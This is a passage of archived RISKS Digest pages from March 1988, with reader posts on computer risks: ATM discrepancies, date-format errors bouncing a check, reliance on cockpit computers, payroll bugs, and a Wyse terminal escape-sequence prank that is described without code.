This is a frequent problem in database and interactive systems -- either the
designer has an incomplete understanding of the real world environment in which
the software will run, or the end users develop a new requirement and use for
the software.  Users tend to kluge their inputs to get the desired results
rather than request a change in the system.  This may come from a perception
that the system can handle the change without going through a formal
modification.  People can adapt to things that seem intuitive, so it shouldn't
be any big deal for the machine, either.  Perhaps the user's perspective is not
that the machine can adapt, but that the meaning is so intuitively obvious that
no adaptation is necessary.

Those of us who write interactive software have learned (sometimes through
painful experience) that no input can be taken for granted.  Ingenious users
can always come up with things that will screw up a program, or use it in ways
that corrupt the system.  We have learned how to guard against many types of
invalid input, but the quest for the "idiot proof system" goes on.  The problem
may grow worse with time.  As our systems gain more "expert" capability, they
will have the appearance of having real-world knowledge and some common sense.
When users depend on that human quality in their systems failures abound.
Increasing capability will bring yet more RISKS in computer systems.

      [Guess what?  I found the "NONE" case in <A HREF="/Risks/3.12.html">RISKS-3.12</A>, 24 June 1986, 
      contributed by Chuck Price, and augmented by yours truly.  It was
      supposedly CALIFORNIA, which now instructs officers to always write
      "NONE" in the case of unknown plate.  I suppose "N.A." (not available) or
      "UNKNOWN" might also cause trouble.  Having 7 characters adds more fun,
      but there are plenty of plates in any case that would be reminiscent of
      Abbott and Costello:
         Officer: "Please give me your license plate number."  
         Driver:  "NEVER" or "WHY" or "WHY NOT" or "DON'T ASK".
      But, if you really want to confuse the computer matching programs, you
      might opt for something like 1OI0O01, which on California plates would
      be quite hard to read accurately as it flies by.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
ATM-OS-FEARic pollution (Re: <A HREF="/Risks/6.39.html">RISKS-6.39</A>)
</A>
</H3>
<address>
Jim Sims 
&lt;<A HREF="mailto:sims@stsci.arpa">
sims@stsci.arpa
</A>&gt;
</address>
<i>
Thu, 10 Mar 88 12:33:19 EST
</i><PRE>

I also have an ATM related horror - that the bank didn't catch.

I recently moved to a new city and didn't get around to balancing my chackbook
for a couple of months. When I did I noticed something rather odd.  There were
two ATM withdrawals for $50 spaced one minute apart at an ATM machine about 5
miles from my house, on the evening of the day our furniture arrived. Now, any
other day/combination I wouldn't have caught, but I knew I didn't go to an ATM
that day (certainly NOT one 6 miles away when there are several closer), we had
both cards at home, we ate at home that night, and I have NEVER withdrawn $50
twice when I wanted $100, I withdraw $100 (too lazy? too smart? to push those
buttons twice).

I notified the bank, and spent several months hassling the bank about it, and
after explaining that I deal with computers for a living, they finally decided:

        "We did not make an error, but out of courtesy to you, since you 
        are so convinced, we are restoring the $100 to your account."

I thanked them and advised them to notify "whoever handles computer security"
in their institution.

        [The "SUBJECT:" line refers to the negative effects of developing
        a phobia against ATM systems, in case you hadn't guessed.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
another ATM discrepancy story
</A>
</H3>
<address>
Ken Yap 
&lt;<A HREF="mailto:ken@cs.rochester.edu">
ken@cs.rochester.edu
</A>&gt;
</address>
<i>
Thu, 10 Mar 88 15:01:46 -0500
</i><PRE>
Organization: CS Dept., U of Roch., NY 14627. 

Years ago I used the ATM service of a bank in my home country. One day
I requested a withdrawal. The machine went through the motions of
verifying me, but just before I got the money, the machine shut down.
Cursing my luck I went into the bank and got the money via a teller.

A few days later I received a phone call from the bank. Did I try to
withdraw $X on a certain day? We have a discrepancy between the amount
of money in the ATM and the log. In the end I got my money back.

Since I only got a statement once a month, I don't know what would have
happened if the discrepancy had showed up in my statement a month later.
Risk: The teller makes you sign a receipt before giving you the money. If
the ATM screws up without a trace, how does one even begin to dispute with
the system?
                                     Ken

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
     Re: computer error and learned helplessness
</A>
</H3>
<address>
"James H. Coombs" 
&lt;<A HREF="mailto:JAZBO%BROWNVM.BITNET@MITVMA.MIT.EDU">
JAZBO%BROWNVM.BITNET@MITVMA.MIT.EDU
</A>&gt;
</address>
<i>
Wed, 09 Mar 88 16:49:28 EST
</i><PRE>

Bruce Sesnovich writes:

&gt; The ATMs I'm familiar with here in Massachusetts are monitored by hidden
&gt; cameras, and I imagine the same is true of ATMs in other states.  The
&gt; banks have recourse to the photographs taken by these cameras when a
&gt; transaction is contested.

I have always wondered about those cameras.  What happens if you step back
out of view? wear a mask?  Wear a hat pulled down over your face?  I doubt
very much that those cameras have sophisticated pattern recognition (let's
hold the transaction until we get a good shot of a real human face).  So
what will banks do if the picture for a transaction doesn't enable us to
identify who the agent was or wasn't?
                                                  --Jim

Dr. James H. Coombs, Software Engineer, Research          jazbo@brownvm.bitnet
Institute for Research in Information and Scholarship (IRIS), Brown University

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Why don't they learn?  (American vs European Date formats)
</A>
</H3>
<address>
Gary Friedman
&lt;<A HREF="mailto:garyf@devvax.Jpl.Nasa.Gov ">
garyf@devvax.Jpl.Nasa.Gov 
</A>&gt;
</address>
<i>
Wed, 9 Mar 88 17:18:44 PST
</i><PRE>

This is hardly a technology-related RISK, but it certainly falls within the
categories of low-level, people-not-thinking errors that have flooded recent
digests.

A friend of mine, who is backpacking (is there a RISK in verbing nouns?)
throughout Europe, possesses an extra AMEXCO card on my account displaying his
name.  (This is to assure instant cash in case of emergencies.)

One day I got a call from someone claiming to be from American Express,
stating that one of my checks that was cashed in one of the American offices
had bounced, and that if I didn't cover the ~$400 debt in three days my
account would be attacked by corporate white blood cells.  To my recollection,
I had written no such checks, although I did cash a check with them while in
London three months earlier for a similar amount.

Although quite courteous, she refused to reveal crucial information such as my
account number or exactly where and when the check was cashed.  ("We're not
allowed to give that information over the phone.")  Lacking proof, I treated
the call as if it was a prank and informed her that I would take no action
unless I saw physical evidence, like perhaps the bounced check.

Two days later the check came in the mail.  It was written and cashed by my
friend overseas.  Three days worth of investigations revealed the following:

- The "American Office" that AMEXCO had mentioned was located in London.

- My friend's account had plenty of funds to cover the check.

- The bank rejected the check as being 'stale' (more than 6 months old.)  The
  check was written only two weeks earlier.

The problem was traced back to the discrepancy between the European and North
American date formats.  Since the check was written on December 4, 1987, the
teller in London wrote

	4.12.87

which the bank in the US quickly deciphered as April 12, 1987 and pronounced
the check stale!

Issues:

1) Why does AMEXCO call their outlets in London "American Offices"?  Does it
   communicate to anyone the office's location?

2) I can't believe this hasn't happened before.  A company policy of spelling
   out the months, even in abbreviated form, will prevent this type of error
   (which AMEXCO *must* be prone to) from happening again.

3) Their security measures are so good that they render their phone queries
   unauthenticatable.  (Pretend it's a real word.)  There are simple systems
   available to let customers know that AMEXCO's calls are legitimate without
   compromising confidentiality.

I'm hardly disgusted, as I related to AMEXCO simple procedural changes to
prevent future occurrences and they seemed to regard the suggestions as being
valuable.

Gary Friedman, Jet Propulsion Laboratory - NASA, 4800 Oak Grove Drive, 
Pasadena, CA 91109.   (818) 354-0410  Uucp: {cit-vax,elroy,psivax}!jplpro!garyf
Arpa: jplpro!garyf@cit-vax.ARPA -or- garyf@jplpro.JPL.NASA.GOV

             [The problem of wrong or incompatible data formats has 
             been the source of a variety of incidents reported here... 
             But this one is a little like trying to get the others to 
             drive on the right (or left, depending upon which is right) 
             side of the road.  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
     Computers on Aircraft
</A>
</H3>
<address>
Keith Bjorndahl 
&lt;<A HREF="mailto:BJORNDKG%UREGINA1.BITNET@CUNYVM.CUNY.EDU">
BJORNDKG%UREGINA1.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Thu, 10 Mar 88 16:58:25 CST
</i><PRE>

  &gt;In most cases, the (computer) user is not told to believe absolutely the
  &gt;evidence of a machine over the evidence of his senses. But in the case of
  &gt;aircraft he is explicitly trained to do so. This behooves us (as 
  &gt;programmers, etc.) to make sure that the machine is telling the truth!
  &gt;                                                               Hugh

   I don't believe that pilots are expected to believe computers over
indications given by other sources.  It was not long ago that there was a near
miss on an overseas flight in the Gander control area which was caused in part
by the entry of wrong data into the flight computer.  The flight went 60 miles
off course because the computer was being used as the sole source of navigation
information.  Other more conventional methods of navigation were not used to
cross check the information given by the flight computer.  We must remember the
garbage-in/garbage-out rule, but we must be aware that we can always anticipate
that from time to time there will be some garbage in.  Every system must be
designed to reduce the chance of this garbage producing catastrophic results.
Now, most airlines require that more than one method of navigation be used to
cross check the values produced by the flight computer.  Now and then, we just
have to use our eyes and our minds and ALL of the instruments together to
narrow the RISK of one failure leading to another.
                                                              Keith

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Re: Reliance on computers (Inland Steel furnace burnout)
</A>
</H3>
<address>
&lt;<A HREF="mailto:dan@WILMA.BBN.COM">
dan@WILMA.BBN.COM
</A>&gt;
</address>
<i>
Thu, 10 Mar 88 11:23:45 -0500
</i><PRE>

Wow, a huge, expensive steel furnace that doesn't have a control
system as smart as the one on most home furnaces!  If my oil furnace
turns the pump and the igniter on, but doesn't get a rise in temperature
after a minute or so, it shuts off automatically.  And it doesn't even
have a PDP-11 in it.

No doubt Inland Steel originally relied on workers to do the job, and
neglected to think about the problems inherent in replacing people with
computers.  Fortunately home furnaces are designed by people who know that
they will be operated unattended (and used by people who know nothing about
them), and so have lots of safety devices.
                                                     Dan Franklin

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Lousy Lazy UNIX Linkers 
</A>
</H3>
<address>
Michael I. Bushnell
&lt;<A HREF="mailto:gatech!turing!mike@rutgers.edu ">
gatech!turing!mike@rutgers.edu 
</A>&gt;
</address>
<i>
Wed, 9 Mar 88 11:33:46 MST
</i><PRE>

Actually, there is a way.  If you think about it, you will realize that a
program of your design can find out all the symbols in the library, after
all, ld finds out.  And, there is such a tool: nm.  Just say "nm libfoo.a"
and it will print all the symbols used or defined in the library.

Michael I. Bushnell, mike@turing.unm.edu, {ucbvax,gatech}!unmvax!turing!mike

</PRE>
<A NAME="subj12"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj12.1">
Need References to "Environmental Bugs"
</A>
</H3>
<address>
Gene Spafford
&lt;<A HREF="mailto:spaf@purdue.edu ">
spaf@purdue.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 10 Mar 88 17:32:07 GMT
Organization: Department of Computer Science, Purdue University

I need to develop a body of references to published descriptions of bugs
resulting from changes in environment.  That is, programs which worked fine on
one machine, but failed to work when ported to another machine or had the
current system upgraded, either due to a change in data type precision, change
in memory size, timing differences, etc.  Also appropriate are references to
programs that failed to work simply because the machine involved didn't have
the precision or range or memory that the programmer assumed, even though the
code itself was "correct."

I'm *not* interested in hearing anecdotal references; I want examples
(compilations and theoretical studies would be best) that have appeared in the
literature in the past 10 years.  Note that I'm not asking about portability
problems, per se, but about failures of the actual machine to match the
programmer's virtual machine -- "environmental errors."

If there is sufficent interest and PGN allows, I'll summarize for RISKS what
I get back.

Thanks in advance!

Gene Spafford, Dept. of Computer Sciences, Purdue University, W. Lafayette 
IN 47907-2004  spaf@cs.purdue.edu  uucp ...!{decwrl,gatech,ucbvax}!purdue!spaf

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.40.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.42.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-77</DOCNO>
<DOCOLDNO>IA012-000129-B043-293</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.42.html 128.240.150.127 19970217020043 text/html 25353
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:59:07 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 42</TITLE>
<LINK REL="Prev" HREF="/Risks/6.41.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.43.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.41.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.43.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 42</H1>
<H2>  Sunday 13 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
A legal problem -- responses sought 
</A>
<DD>
<A HREF="#subj1.1">
Cathy Reuben
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computers on Aircraft 
</A>
<DD>
<A HREF="#subj2.1">
Robert Dorsett
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  High-Tech Trucking 
</A>
<DD>
<A HREF="#subj3.1">
Rick Sidwell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Programs crying wolf 
</A>
<DD>
<A HREF="#subj4.1">
Peter da Silva
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Pay cut 
</A>
<DD>
<A HREF="#subj5.1">
Martin Taylor
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Dangers of Wyse terminals 
</A>
<DD>
<A HREF="#subj6.1">
A.Cunningham
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Burnt-out LED 
</A>
<DD>
<A HREF="#subj7.1">
G. L. Sicherman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Display self-test 
</A>
<DD>
<A HREF="#subj8.1">
Peter da Silva
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Calculator Self-tests: HP34C has a full functional self-test 
</A>
<DD>
<A HREF="#subj9.1">
Karl Denninger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Trying harder on complex tasks than on simpler tasks 
</A>
<DD>
<A HREF="#subj10.1">
Robert Oliver
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Police using computers - Licence plate matches - etc, etc. 
</A>
<DD>
<A HREF="#subj11.1">
Ted G. Kekatos
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
A legal problem -- responses sought
</A>
</H3>
<address>
Cathy Reuben 
&lt;<A HREF="mailto:REUBEN%HULAW1.BITNET">
REUBEN%HULAW1.BITNET
</A>&gt;
</address>
<i>

</i><PRE>
Organization: Harvard Law School

    [Forwarded-From: John W Manly &lt;JWMANLY%AMHERST.BITNET@MITVMA.MIT.EDU&gt;]

    I am writing a law school paper on the proper allocation of rights
in software between programmers and their employers.  I am curious to
know how well the legal standards I've uncovered line up with the way
people in the industry peceive the equities of the situation.

    Below is a hypothetical which lays out the basic problem.  Please
send me your reactions.  I don't need anything extensive, just a short
statement of where you personally come out and why, and from what
perspective (i.e. programmer, employer, student, etc.) you're
approaching the problem.  I'm not interested in what you think the law
is, only what you feel it should be.  Many thanks!

(Please be sure to respond directly to me [and NOT TO RISKS]:

        Cathy Reuben, Harvard Law School, REUBEN@HULAW1.BITNET

 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    In 1981 Mr. John Allan receives a Masters degree in computer
science from University of Massachusetts.  At that time, Allan
delivers a paper entitled "No More Manuals:  The Use of Touch and
Sound Sensitive Hardware to Promote Accessibility to Computer
Technology."

    Shortly after that time, Allan is recruited by a representative
from Medicomp, Inc., a small company servicing hospitals.  Medicomp's
primary product is MEDSTORE, a database for storing patient
information.  Medicomp seeks to enhance MEDSTORE with an on-line,
touch-sensitive help system.

    Allan accepts a programming position with Medicomp.  During his four
years there, he develops modules for a touch- sensitive help facility.
These modules are incorporated into MEDSTORE.  Largely due to
MEDSTORE's remarkable ease of use, Medicomp quickly becomes the leading
supplier of patient information database systems for hospitals.

    In 1985, Allan leaves Medicomp.  At that time, he teams up with a
lawyer to create TAXELF, do-it-yourself tax preparation software for small
businesses.  TAXELF utilizes Allan's now famous touch-sensitive help
utility, and is projected to be a huge commercial success.

    Shortly before TAXELF is due to be released,  Medicomp files suit
against Allan.  Their underlying argument is simple:   "As the investor in
touch-sensitive help, Medicomp deserves the fruits of its success.  You,
Allan, basically stole something that belongs to us."

    Allan's answer to Medicomp's argument is also straight-forward and
compelling:  "You hired me as an expert in help utilities, and you got
what you paid for.  Any further benefits from the system should flow to me
as creator."

Questions: (for use as a guide only)

        Should Allan have the right to reuse the touch sensitive
help utility he developed while at Medicomp?

        a.  Right to copy the actual code?
        b.  Right to rewrite the code from memory?
        c.  Right to use the program structure and organization?
        c.  Right to use touch sensitive help in general?

        What rights, if any, should Medicomp retain in the utility
which they hired Allan to produce?

        a.  Right to use the utility in MEDSTORE?
        b.  Right to use the utility in other Medicomp products?
        c.  Right to prevent Allan from using the utility?
        d.  Right to prevent Allan from using touch sensitive help?

        Should Allan's rights to use the modules, or the ideas they
embody, be any greater than those of the general public?

        Has the act of answering these questions changed your first
impression of what is just in this case?  If so, why did you back
down?!  Should you have?

                 [I trust that Cathy will share her results with RISKS.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computers on Aircraft [<A HREF="/Risks/6.41.html">RISKS-6.41</A>]
</A>
</H3>
<address>
Robert Dorsett
&lt;<A HREF="mailto:mentat@louie.cc.utexas.edu ">
mentat@louie.cc.utexas.edu 
</A>&gt;
</address>
<i>
Sun, 13 Mar 88 04:47:05 CST
</i><PRE>

&gt;  I don't believe that pilots are expected to believe computers over
&gt;indications given by other sources.  

What other sources are they supposed to use?  Consider the standard
navigational equipment on the 747-200:

	Horizontal Situation Indicator--computer processed display.
	Flight Director--computer generated flying instructions.
	Autopilot--analog/digital computer.
	Flight Performance Computer/Flight Management System--computer 
          used for flight management, calculating fuel consumption, etc.
	Inertial Navigation System--computer used for "blind" navigation.

The INS is usually linked to the HSI and autopilot; there are a variety of
configurations that the pilot may select.  The FMS, when installed, can 
link into the network as well, and fly the airplane efficiently from take-
off to landing.

On the 747-400, Airbus A320 (and the forthcoming A340), MD-11 (the DC-10
derivative) and, to a lesser degree, the Boeing 757 and 767, the pretense of
electromechanical instruments has been done away with altogether, and replaced
with CRT displays, under the assumption that the CRT displays are less prone
to failures.  The problem here is that the *means* of display may in itself
contribute to error: for example, the current vogue for the traditional line
of instruments displaying a "clock" airspeed, artificial horizon, and
altimeter, is to have a computer-displayed "tape" airspeed, and tape altimeter
bracketing the horizon.  The immediate sacrifice is the lack of "trend"
information:  tape instruments are only marginally better than a digital LED
display.  Research on these issues is continuing, but what I've read indicates
that NASA is advising caution, while Boeing and Airbus are producing their
own, contrary figures.

The point must be made that, in modern aircraft, all of the pilot's inputs
are preprocessed by computers.  The Boeing philosophy thus far has been to
simplify overall design and efficiency by introducing automation; the Airbus
philosophy has been to redefine the role of the pilot in the cockpit while
simultaneously changing the way information is displayed.  It is clear that
Boeing has considered following in Airbus' footsteps during the design 
phase of the (suspended) 7J7.

On the navigation issue: airlines have little say in how their pilots actually
navigate: it's largely up to the background of the individual pilot.  While
one pilot may double- or triple-check sources, another might prefer to read
the newspaper: consider the worst-case scenario, the incompetent captain and
the resentful and disinterested first officer.  There is a great tendency in
modern airplanes to rely on the INS/autopilot link, to great detriment, as
evidenced by the China Airlines flip over California in 1985, or the KAL 007
tragedy.  A recent conference sponsored by the Flight Safety Foundation, held
in Tokyo, advocated a return to the attitudes of the early 1960's, and a
return to basic skills.  It is clear that highly automated cockpits serve to
insulate the pilot from the airplane, and thus increase boredom and stress.
Design engineers, on the other hand, see the pilot error problems, and try to
insulate the pilot yet further, creating more automated and "safe" systems.
Modern cockpits such as the A320's, are contrary to the recommendations of
organizations such as the Flight Safety Foundation's: the reasons most often
cited are minimising training and maintenance costs, and reducing "pilot
workload", all at the expense of long-term pilot welfare.

Robert Dorsett	   Internet: mentat@walt.cc.utexas.edu
UT Austin    	   UUCP: {ihnp4,allegra,ihnp4}!ut-emx!walt.cc.utexas.edu!mentat

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
High-Tech Trucking
</A>
</H3>
<address>
Rick Sidwell 
&lt;<A HREF="mailto:sidwell@commerce.UCI.EDU">
sidwell@commerce.UCI.EDU
</A>&gt;
</address>
<i>
Sat, 12 Mar 88 08:13:37 -0800
</i><PRE>

Here is an article from a report sent by California State Senator John Seymour
to all of his constituents.  The issue has been discussed before in RISKS; this
is a fresh example.

  "HIGH TECH TRUCKING"
  
  "Under state and federal law, truck drivers are required to keep handwritten
  logs to record the number of miles and hours they're on duty.  These logs are
  easily tampered with and are often a work of fiction as some drivers try to
  circumvent highway safety laws designed to prevent accidents.
  
  "The result has been a dramatic increase in truck-related accidents, injuries
  and deaths on our highways.  According to the California Highway Patrol, last
  year alone, 678 Californians died and more than 16,000 were injured in truck-
  related accidents.  Snce 1982, truck-involved fatalities are up over 40 
  percent and truck-related injuries are up more than 32 percent.
  
  "In his continued leadership role in highway safety, Senator Seymour has 
  introduced legislation to require large commercial trucks to install 'black
  boxes.'  The 'black box' is an onboard computer that automatically records
  drive time, speed, distance traveled as well as other important functions
  that reveal how a driver handles his rig.
  
  "'More and more, truck drivers are pushing themselves and their equipment
  beyond their limits,' said Seymour.  'Driver fatigue, equipment failure and
  speeding are killing hundreds of innocent people every year on our highways.
  By requiring the use of "black boxes," heavy commercial truck drivers will
  be forced to more closely adhere to highway safety laws.'"
  
  
When I first read this, I noticed that there was a potential invasion of
privacy in that a highway patrolman could look at the electronic log and
see if the trucker had been speeding, and give him a ticket if so.  Then
it dawned on me that this is the very purpose of requiring the "black
boxes" to be installed!  It would be interesting to know what the "other
important fuctions that reveal how a driver handles his rig" are.
  
</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Programs crying wolf (RISKS DIGEST 6.38)
</A>
</H3>
<address>
Peter da Silva
&lt;<A HREF="mailto:peter@sugar.UUCP ">
peter@sugar.UUCP 
</A>&gt;
</address>
<i>
11 Mar 88 08:48:29 GMT
</i><PRE>
Organization: Sugar Land UNIX - Houston, TX

Once upon a time a programmer who regularly used both MS-DOS and UNIX systems
sat down at an MS-DOS system and typed "format&lt;CR&gt;". The program replied:

	PLEASE INSERT FLOPPY DISK IN DRIVE C: AND HIT RETURN

The programmer stuck the floppy in the machine, hit &lt;CR&gt;, and formatted his
hard disk. What's wrong with this picture?

	(1) The UNIX format program took a reasonable default if executed
	    with no parameters: the floppy drive. The MS-DOS format program
	    took a stupid default: the current drive.

	(2) The MS-DOS format program printed an incredibly stupid "warning"
	    message. "Please insert floppy disk in this hard drive".

I understand that the situation has been corrected since then.

Peter da Silva  `-_-'  ...!hoptoad!academ!uhnix1!sugar!peter

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Pay cut
</A>
</H3>
<address>
Martin Taylor 
&lt;<A HREF="mailto:mmt@zorac.ARPA">
mmt@zorac.ARPA
</A>&gt;
</address>
<i>
Fri, 11 Mar 88 17:29:25 est
</i><PRE>

I'm not sure for whom this is a risk, but today's Toronto Globe and Mail
reports that an ex-cabinet minister was placed in charge of a new agency
which was expected to be quite important.  But the politics of the situation
changed and the agency had very little to do, so the minister asked that his
pay should be halved.  The possibility of reducing someone's pay had not
been programmed, and the computer reported, and someone publicised, that his
pay had been doubled.  Very embarrassing for him and for the government of
the day.  (This happened some years ago).

Martin Taylor  (mmt@zorac.arpa)

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Dangers of Wyse terminals
</A>
</H3>
<address>
A.Cunningham 
&lt;<A HREF="mailto:cstjc@ITSPNA.ED.AC.UK">
cstjc@ITSPNA.ED.AC.UK
</A>&gt;
</address>
<i>
Fri, 11 Mar 88 15:46:08 GMT
</i><PRE>
Organisation: Dept of Computer Science, University of Edinburgh

The department of computer science at Edinburgh University has a collection of
Sun workstations for use by first year undergraduates.  Connected to the Suns
via pads are a number of Wyse75 terminals.  Recently mail was sent to users
which had the following effect:

    1). The user's keyboard was locked and his screen blanked.
    2). His terminal was put into reflect mode (input to terminal
        was reflected back to the host).
    3). The nasty bit. Files permissions were changed and processes
        were killed.

The first year students involved were caught and now face disciplinary
proceedings. A few questions were raised that may be of interest to other users
of the terminals.

    1). Why are the features in the terminal in the first place? I can
        only assume that Wyse put them in as security features. A hacker
        accesses your system you lock out the terminal.
    2). Has anyone had similar experiences? I've only been reading this
        group for a year while we've know of the possiblities of the Wyse
        for at least two. At first it was limited to changing a friend's
        screen to inverse mode. We never envisaged it being used so
        destructively.
    3). Is there a modification to the Wyse to stop it?  We need this to stop
        next year's CS1 from doing the same thing again.

           [This is another tip-of-the-iceberg problem.  All of the control
           characters, escape sequences, and function keystrokes that are 
           used (constructively) by software driving your terminal can also be
           MISUSED by any programs running as if they were you, Trojan horses,
           etc.  Recall that an early example was Trojan Messages, which 
           when READ (not interpreted) would GETCHA.  PGN]

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Burnt-out LED (Re: <A HREF="/Risks/6.39.html">RISKS-6.39</A>)
</A>
</H3>
<address>
g.l.sicherman
&lt;<A HREF="mailto:gls@odyssey.ATT.COM ">
gls@odyssey.ATT.COM 
</A>&gt;
</address>
<i>
12 Mar 88 05:43:00 GMT
</i><PRE>
Organization: AT&amp;T Bell Laboratories, Middletown, NJ

Al Stangenberger's lament points up the vulnerability of LED digits to burnout
errors.  Maybe we should redesign the digits to look like this?

     --            --    --            --          --     --    --
    |  |   |  |      |     |   |  |   |     |        |         |  |
            --     --    --     --     --    --    --     --    --
    |  |   |  |   |        |      |      |  |  |  |  |   |  |     |
     --            --    --     --     --    --           --

It's ugly but at least it detects single errors.  (Surely somebody has 
thought of this already?  Are arabic numerals technologically obsolete?)

A recent issue of _Industrial Design_ (Jan. 1974) presents an entire
alphabet in this format.  Imagine the potential for transmission errors!
(In fact, the article goes even further: it presents a four-stroke
alphabet.  How's that for low resolution?)

Col. G. L. Sicherman   ...!ihnp4!odyssey!gls

   [The visual confusion between 6 and 8 is a bit awesome, and the
   unnaturalness of 1 and 7 is also.  (The GE check code is a little
   easier to deal with -- people can ignore it.)  But putting in display
   self-checks that tries to GET-THE-LED-OUT seems much more acceptable.  PGN]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re: Display self-test (<A HREF="/Risks/6.39.html">RISKS-6.39</A>)
</A>
</H3>
<address>
Peter da Silva
&lt;<A HREF="mailto:nuchat!peter@uunet.UU.NET ">
nuchat!peter@uunet.UU.NET 
</A>&gt;
</address>
<i>
